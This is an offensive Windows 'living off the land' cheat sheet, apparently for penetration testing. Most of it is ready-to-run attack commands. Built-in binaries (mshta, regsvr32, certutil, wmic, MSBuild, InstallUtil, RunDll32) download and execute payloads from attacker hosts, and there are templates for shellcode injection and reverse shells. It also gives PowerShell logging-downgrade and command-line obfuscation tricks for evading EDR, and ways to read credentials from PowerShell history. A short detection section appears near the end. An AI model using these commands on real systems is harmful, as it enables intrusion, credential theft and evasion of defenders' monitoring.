LOLBins & LOLBAS

Overview

Living Off the Land Binaries (LOLBins on Linux/macOS, LOLBAS on Windows) are legitimate, system-provided executables that can be abused for attacker objectives — execution, download, persistence, bypass, reconnaissance, and more. Because these binaries are signed by Microsoft (or the OS vendor), they bypass application whitelisting and often raise fewer AV/EDR alerts than dropped custom tools.

Reference: LOLBAS Project (lolbas-project.github.io) — comprehensive catalog of Windows binaries with attack use cases.

// living off the land — common lolbins and their abuse cases

Execution via LOLBins

Run code through trusted binaries to bypass application whitelisting and reduce signature detections.

># mshta.exe — executes HTA applications (HTML + script):
mshta.exe http://10.10.14.5/shell.hta
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""powershell -ep bypass -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"",0,True)(window.close)")

# regsvr32.exe — COM scriptlet execution (squiblydoo):
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
# /s: silent, /n: no DllRegisterServer, /u: unregister, /i: URL of SCT file

# rundll32.exe — execute DLL export or JavaScript:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc.exe",0,true)
rundll32.exe shell32.dll,Control_RunDLL payload.dll
rundll32.exe advpack.dll,LaunchINFSectionEx payload.inf,,1

# wmic.exe — execute via XSL transform:
wmic os get /FORMAT:"http://10.10.14.5/shell.xsl"
# .xsl file contains JScript/VBScript code

# certutil.exe — execute base64 encoded payload:
certutil.exe -decode payload.b64 payload.exe
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe payload.exe

# msiexec.exe — run MSI packages:
msiexec.exe /q /i http://10.10.14.5/shell.msi

# forfiles.exe — execute files with specific extensions:
forfiles /p c:\windows\system32 /m notepad.exe /c "powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"

MSBuild — Inline C# Code Execution

MSBuild compiles and executes C# code embedded in an XML project file. The binary is Microsoft-signed and bypasses AppLocker. No external compiler needed — MSBuild does it all inline.

# Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
# Execute an XML project file:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# payload.xml — launches process via inline C#:
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuildTask"><ClassExample /></Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task><Code Type="Class" Language="cs"><![CDATA[
      using System;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;
      public class ClassExample : Task {
        public override bool Execute() {
          System.Diagnostics.Process.Start("powershell.exe", "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')");
          return true;
        }
      }
    ]]></Code></Task>
  </UsingTask>
</Project>

InstallUtil / RegAsm / RegSvcs — .NET AppLocker Bypass

These .NET framework utilities execute code from assemblies. The /U flag triggers the Uninstall method which runs arbitrary code without requiring install privileges.

# Compile a malicious .NET DLL (payload.cs with Installer class):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library payload.cs

# Execute via InstallUtil (triggers Uninstall method):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# Execute via RegAsm:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll

# Execute via RegSvcs:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll

# WMIC process creation (local and remote):
wmic process call create "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"
wmic /node:192.168.1.10 /user:CORP\admin /password:Password123! process call create "cmd.exe /c whoami > C:\out.txt"

# WMIC XSL execution (JScript in XSL file):
wmic os get /FORMAT:"http://10.10.14.5/shell.xsl"

PowerShell Downgrade Attack (Bypass Script Block Logging)

PowerShell v2 predates Script Block Logging (introduced in v3). Downgrading to v2 prevents commands from being logged in Event Viewer. Check if v2 is still installed before attempting — it persists on many hosts.

# Check current version:
Get-Host   # Version: 5.1.xxxxx

# Downgrade to v2 (bypasses Script Block Logging):
powershell.exe -version 2
Get-Host   # Version: 2.0

# From CMD:
powershell.exe -version 2 -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/s.ps1')"

# Detection: Event 400 PowerShell engine start — check EngineVersion field

Native AD Recon with Built-in Windows Commands

When external tools cannot be loaded, native Windows commands provide full AD enumeration capability. Use net1 instead of net to avoid some signature-based detections on the "net" string.

# Host and domain info:
hostname
[System.Environment]::OSVersion.Version
systeminfo                                # OS version, patches, domain, hotfixes
echo %USERDOMAIN%                         # Domain name (CMD)
echo %logonserver%                        # DC the host checks in with (CMD)

# AD enumeration with net (or net1 for detection evasion):
net user /domain                          # All domain users
net group /domain                         # All domain groups
net group "Domain Admins" /domain         # DA members
net group "Domain Controllers" /domain    # DCs
net group "domain computers" /domain      # All computers
net accounts /domain                      # Password policy
net localgroup administrators /domain     # Local admins (includes DA)
net share                                 # Current shares
net view /domain                          # PCs in domain

# net1 — same functionality, different binary name:
net1 user /domain
net1 group "Domain Admins" /domain

Dsquery — Native LDAP Queries

dsquery is available on any host with the AD DS role installed, and dsquery.dll exists on all modern Windows systems. It queries LDAP directly without external tools.

# Enumerate users and computers:
dsquery user
dsquery computer

# Wildcard search — all objects in an OU:
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# Find users with PASSWD_NOTREQD flag (blank password allowed):
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Find accounts with adminCount=1 (was in privileged group):
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(adminCount=1))" -attr distinguishedName

# Combine dsquery + dsget for group membership:
dsquery group -name "Domain Admins" | dsget group -members -expand

PowerShell History File

PowerShell saves command history to a text file per user. This can contain credentials, scripts, and sensitive commands typed by admins.

# Read current user's PS history:
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Search for credentials in history:
Select-String -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Pattern "password|cred|pass" -CaseSensitive:$false

# Clear history (defensive):
Remove-Item $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

InstallUtil — Detailed Code Execution via Installer Class

InstallUtil executes code by calling the Uninstall method of a class that extends System.Configuration.Install.Installer. The binary lives in %WINDIR% so it passes default AppLocker rules. The /U flag triggers the uninstall path, running arbitrary code without install privileges. The Main method can be empty — the installer class handles execution.

# InstallUtil locations:
# 32-bit: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
# 64-bit: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe

# Verify AppLocker allows InstallUtil (default rules permit it):
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe

# C# payload template — extend Installer, override Uninstall:
# (Visual Studio: Console App .NET Framework, add reference to System.Configuration.Install.dll)
# Reference DLL location:
# C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll

using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;

public class NotMalware_IU {
    public static void Main(string[] args) { }  // empty Main — execution via Uninstall
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer {
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public override void Uninstall(System.Collections.IDictionary savedState) {
        // Shellcode decryption + injection logic here
        // e.g., AES decrypt bufEnc → VirtualAlloc → copy → VirtualProtect → CreateThread
    }
}

# Compile as x64 Release, then execute (triggers Uninstall method):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\NotMalware_IU.exe

# Flags: /logfile= suppresses log creation; /LogToConsole=false hides output; /U calls Uninstall

RunDll32 — DLL Execution via Exported Function

RunDll32 loads a DLL and calls a named export. By creating a .NET DLL that exports a function via the DllExport NuGet package (which enables unmanaged exports from managed code), arbitrary code runs through a trusted Microsoft binary. Both RunDll32 locations pass default AppLocker policies.

# RunDll32 locations:
# 32-bit: C:\Windows\SysWOW64\rundll32.exe
# 64-bit: C:\Windows\System32\rundll32.exe

# Verify AppLocker allows RunDll32:
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\rundll32.exe

# Project setup: Visual Studio, Class Library (.NET Framework) template
# Add DllExport NuGet package (enables unmanaged exports from .NET):
# NuGet source → search DllExport → Install → mark Installed checkbox → Apply → Reload All

# C# DLL payload template with exported function:
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using RGiesecke.DllExport;  // from DllExport NuGet package

namespace RShell_D {
    internal class Program {
        [DllExport("DllMain")]  // exported function name callable by RunDll32
        public static void DllMain() {
            // Reverse shell or shellcode execution logic here
            // Note: hardcode IP/Port since no args passed to DLL exports
            // For 32-bit target: use SysWOW64 PowerShell path
            // C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
        }
    }
}

# Compile: switch Debug→Release, set x86 or x64 depending on target architecture
# For 64-bit: change Any CPU to x64 via Configuration Manager

# Execute — RunDll32 loads the DLL and calls DllMain export:
# 32-bit DLL:
C:\Windows\SysWOW64\rundll32.exe C:\path\to\RShell_D.dll,DllMain

# 64-bit DLL:
C:\Windows\System32\RunDll32.exe C:\path\to\RShell_D.dll,DllMain

# Bypasses AppLocker (binary in %WINDIR%) and real-time protection (custom payload)

Command-Line Obfuscation — ArgFuscator (MITRE T1027.010)

Command-line obfuscation (T1027.010) manipulates how arguments are passed to LOLBins so that the command still executes identically but doesn't match signatures. Many Windows/Linux/macOS executables parse arguments with unexpected flexibility — case insensitivity, Unicode look-alikes, extra quotes, slash/dash interchangeability — that can fool EDR command-line monitoring. ArgFuscator.net is an interactive tool (also available as Invoke-ArgFuscator in PowerShell) that generates obfuscated variants of common LOLBin commands.

Obfuscation Techniques

# 1. Random case — many Windows binaries are case-insensitive for switches:
certutil.exe -URLCACHE -SPLIT -F http://10.10.14.5/shell.exe output.exe
CeRtUtIl.ExE -uRlCaChE -SpLiT -f http://10.10.14.5/shell.exe output.exe

# 2. Slash / dash substitution — Windows accepts both / and - as option prefix:
certutil.exe -urlcache -f http://10.10.14.5/shell.exe output.exe
certutil.exe /urlcache /f http://10.10.14.5/shell.exe output.exe
certutil.exe /URLCACHE /F http://10.10.14.5/shell.exe output.exe

# 3. Unicode look-alikes (superscript/modifier characters) — bypass ASCII string matching:
# Superscript 'a' (U+1D43) looks like 'a' to humans, different bytes to signature:
certutil.exe -urlcɑche -f http://10.10.14.5/shell.exe output.exe

# 4. Quote insertion — quotes can appear anywhere in arguments on Windows:
certutil.exe -url"cache" -f http://10.10.14.5/shell.exe output.exe
certutil.exe -url""cache -split -f http://10.10.14.5/shell.exe output.exe

# 5. Extra slashes in file paths:
certutil.exe -urlcache -f http://10.10.14.5/shell.exe C:\\\Windows\\Temp\\output.exe

# 6. Path traversal in file paths (resolves to same location):
certutil.exe -urlcache -f http://10.10.14.5/s.exe C:\Windows\.\Temp\..\Temp\s.exe

# 7. Combining techniques:
CeRtUtIl.ExE /uRlCaChE /F http://10.10.14.5/s.exe "C:\Win""dows\Temp\s.exe"

Detection Evasion Notes

# Why command-line obfuscation works:
# - EDR command-line rules use exact string matching (case-sensitive regex)
# - Process creation logs (Sysmon Event ID 1) capture the EXACT command line
# - If the signature matches "certutil.*-urlcache", randomizing case bypasses it

# What defenders need to detect obfuscation:
# - Normalize command lines before matching (lowercase, collapse quotes)
# - Use behavioral rules (certutil making network connections)
# - Flag Unicode characters in process arguments
# - Alert on process tree anomalies regardless of argument content

# Combined OPSEC — layer obfuscation with other techniques:
# 1. Use ArgFuscator to obfuscate the LOLBin invocation
# 2. Use PowerShell -EncodedCommand to hide the outer command
# 3. Invoke via mshta/wscript (adds another process layer)
# 4. Rename binary (copy certutil.exe to svchost32.exe before use)
